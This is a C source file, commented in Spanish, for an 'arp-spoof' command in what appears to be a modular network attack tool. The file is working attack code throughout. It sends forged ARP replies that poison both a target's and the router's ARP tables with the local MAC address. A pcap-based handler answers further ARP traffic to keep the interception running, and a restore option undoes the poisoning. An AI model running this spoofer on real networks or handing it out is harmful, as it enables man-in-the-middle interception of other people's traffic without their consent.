#include <linux/if_ether.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "commands.h"
#include "config.h"
#include "config_types.h"
#include "errs.h"
#include "functions.h"
#include "list.h"
#include "pcap_wrapper.h"
#include "program.h"

#define NAME "arp-spoof"

/*
 * Es usado por el argumeto `handle` para iniciar
 * una instancia de PCAP.
 */
static pcap_t *pcap_handle;

/*
 * Estructura que contiene la interfaz de red
 * que se usara para el ataque.
 */
static config_struct *iface;

/*
 * Variables con la direcciones necesarias.
 * las IPs usadas estan en big-endian
 * (orden de red).
 */

// Direcciones loclaes.
static uint32_t local_ip;
static uint8_t local_mac[6];

// Direcciones del router.
static uint32_t router_ip;
static uint8_t router_mac[6];

// Direcciones objetivo.
static uint32_t target_ip;
static uint8_t target_mac[6];

/*
 * El argumento `help` muestra los argumentos
 * con sus descripciones.
 */
static int spoof_help() {
  printf("help -> " AMARILLO "muestra esta ayuda" RESET "\n"
         "send -> " AMARILLO "envia un paquete de susplantación ARP" RESET "\n"
         "handle -> " AMARILLO
         "captura paquetes ARP para mantener la susplantación en pie" RESET "\n"
         "restore -> " AMARILLO
         "restablece las tablas ARP de los dispocitivos afectados" RESET "\n");
  return EXIT_SUCCESS;
}

/*
 * El argumento `send` se usa para iniciar
 * el ataque ARP.
 * Este envia un ARP reply al objetivo usando
 * la MAC local y la IP del router como fuente.
 */
static int spoof_send() {
  CHECK_ERROR_RETURN(!send_arp_reply(local_mac, router_ip, target_mac,
                                     target_ip, iface->value),
                     "No se pudo enviar el paquete ARP al objetivo",
                     EXIT_FAILURE);
  CHECK_ERROR_RETURN(!send_arp_reply(local_mac, target_ip, router_mac,
                                     router_ip, iface->value),
                     "No se pudo enviar el paquete ARP al router",
                     EXIT_FAILURE);
  return EXIT_SUCCESS;
}

/*
 * Esta funcion es usada por el argumento `handle`
 * para manejar y susplantar los paquetes ARP recividos
 * por el sniffer de pcap.
 * Tras recivir un paquete ARP comprueba que haya sido
 * enviado por el router o por el objetivo y si su destino
 * es el router.
 * Si el paquete usa la operación 1 se responde con un
 * ARP reply a quien envio este paquete usando la MAC
 * local y la y del destino como fuente.
 * Si el paquete usa la operación 2 se responde con otro
 * ARP reply a el destino de este usando la MAC local y
 * la IP de quien lo envio como fuente.
 */
static void packet_handle(u_char *user_d, const struct pcap_pkthdr *header,
                          const u_char *packet) {
  struct arp_header arp =
      *(const struct arp_header *)(packet + sizeof(struct ethhdr));
  if ((arp.spa == router_ip || arp.spa == target_ip) &&
      (arp.tpa == router_ip || arp.tpa == target_ip) && (arp.spa != arp.tpa)) {
    if (arp.op == 1) {
      CHECK_ERROR(
          send_arp_reply(local_mac, arp.tpa, arp.sha, arp.spa, iface->value),
          "Error al enviar el paquete ARP Reply");
    } else {
      CHECK_ERROR(
          send_arp_reply(local_mac, arp.spa, arp.tha, arp.tpa, iface->value),
          "Error al enviar el paquete ARP Reply");
    }
  }
}

/*
 * Esta funcion detiene la escucha del comando
 * cuando se usa el argumento `handle`, si se
 * usa CTRL+C.
 */
void keyboard_handle_interrupt(int sign) { pcap_breakloop(pcap_handle); }

/*
 * El argumento `handle` usa PCAP con un filtro para solo
 * recivir los paquetes ARP, inicia un pcap_loop para pasarle
 * el control de los paquetes recividos a la funcion
 * `packet_handle`.
 * Si se recive CTRL+C se para la escucha.
 */
static int spoof_handle() {
  pcap_handle = NULL;
  CHECK_ERROR_RETURN(
      !wrapper_pcap_open_live(&pcap_handle, iface->value, BUFSIZ, 1, 100, NULL),
      "Error al iniciar pcap", EXIT_FAILURE);

  struct bpf_program fp;
  CHECK_ERROR_CODE_RETURN(!wrapper_pcap_compile(pcap_handle, &fp, "arp"),
                          "no se pudo compilar un filtro con pcap",
                          pcap_close(pcap_handle), EXIT_FAILURE);
  CHECK_ERROR_CODE_RETURN(!wrapper_pcap_setfilter(pcap_handle, &fp),
                          "Error al aplicar el filtro en pcap",
                          pcap_close(pcap_handle), EXIT_FAILURE);

  signal(SIGINT, keyboard_handle_interrupt);
  CHECK_ERROR_CODE_RETURN(
      !wrapper_pcap_loop(pcap_handle, -1, packet_handle, NULL),
      "Error al iniciar escucha en pcap", pcap_close(pcap_handle),
      EXIT_FAILURE);
  signal(SIGINT, no_signal);

  pcap_close(pcap_handle);
  return EXIT_SUCCESS;
}

/*
 * El argumento `restore` se encarga de finalizar
 * la susplantación ARP.
 * Se le envia un paquete ARP al router con las
 * direcciones del objetivo, y se le envia un
 * paquete ARP al objetivo con las direcciones
 * del router.
 */
static int spoof_restore() {
  CHECK_ERROR_RETURN(!send_arp_reply(router_mac, router_ip, target_mac,
                                     target_ip, iface->value),
                     "No se pudo enviar el paquete ARP al objetivo",
                     EXIT_FAILURE);
  CHECK_ERROR_RETURN(!send_arp_reply(target_mac, target_ip, router_mac,
                                     router_ip, iface->value),
                     "No se pudo enviar el paquete ARP al router",
                     EXIT_FAILURE);
  return EXIT_SUCCESS;
}

// Funcion principal del comando.
static int fn_arp_spoof(LIST_ptr args) {
  // Se verifica la integridad de los argumentos.
  if (list_size(*args) != 2) {
    fprintf(stderr, "Uso: " NAME " [operación|help]\n");
    return EXIT_FAILURE;
  }

  // se obtiene el valor de las propiedades necesarias.
  NODE_ptr option_node = list_index_get(1, *args);
  CHECK_ERROR_RETURN(option_node == NULL, "No se pudo acceder al argumento",
                     EXIT_FAILURE);
  iface = config_value("LOCAL_IFACE", *config);
  CHECK_ERROR_RETURN(iface == NULL, "No se pudo obtener la interfaz de red",
                     EXIT_FAILURE);
  CHECK_ERROR_RETURN(!get_local_ip(&local_ip, iface->value),
                     "No se pudo obtener la dirección IP de esta maquina",
                     EXIT_FAILURE);
  CHECK_ERROR_RETURN(!get_local_mac(local_mac, iface->value),
                     "No se pudo obtener la dirección MAC de esta maquina",
                     EXIT_FAILURE);
  config_struct *router_addr = config_value("ROUTER_ADDR", *config);
  CHECK_ERROR_RETURN(router_addr == NULL,
                     "No se pudo obtener la dirección IP del router",
                     EXIT_FAILURE);
  config_struct *router_hwaddr = config_value("ROUTER_HWADDR", *config);
  CHECK_ERROR_RETURN(router_hwaddr == NULL,
                     "No se pudo obtener la dirección MAC del router",
                     EXIT_FAILURE);
  config_struct *target_addr = config_value("TARGET_ADDR", *config);
  CHECK_ERROR_RETURN(target_addr == NULL,
                     "No se pudo obtener la dirección IP objetivo",
                     EXIT_FAILURE);
  config_struct *target_hwaddr = config_value("TARGET_HWADDR", *config);
  CHECK_ERROR_RETURN(target_hwaddr == NULL,
                     "No se pudo obtener la dirección MAC objetivo",
                     EXIT_FAILURE);
  to_addr(&router_ip, router_addr->value);
  to_hwaddr(router_mac, router_hwaddr->value);
  to_addr(&target_ip, target_addr->value);
  to_hwaddr(target_mac, target_hwaddr->value);

  /*
   * Se busca si el argumeto pasado es valido
   * y se le da el control a este.
   */
  char *option_value = (char *)option_node->point;
  if (strcmp(option_value, "help") == 0)
    return spoof_help();
  else if (strcmp(option_value, "send") == 0)
    return spoof_send();
  else if (strcmp(option_value, "handle") == 0)
    return spoof_handle();
  else if (strcmp(option_value, "restore") == 0)
    return spoof_restore();
  fprintf(stderr, "El argumento no es valido, usé el argumento help para mas "
                  "información\n");
  return EXIT_FAILURE;
}

// Estructura del commando.
const Command cmd_arp_spoof = {
    NAME,
    "Ataques de Suplantación ARP empleando las propiedades: "
    "ROUTER_(ADDR/HWADDR) y TARGET_(ADDR/HWADDR)",
    fn_arp_spoof,
};
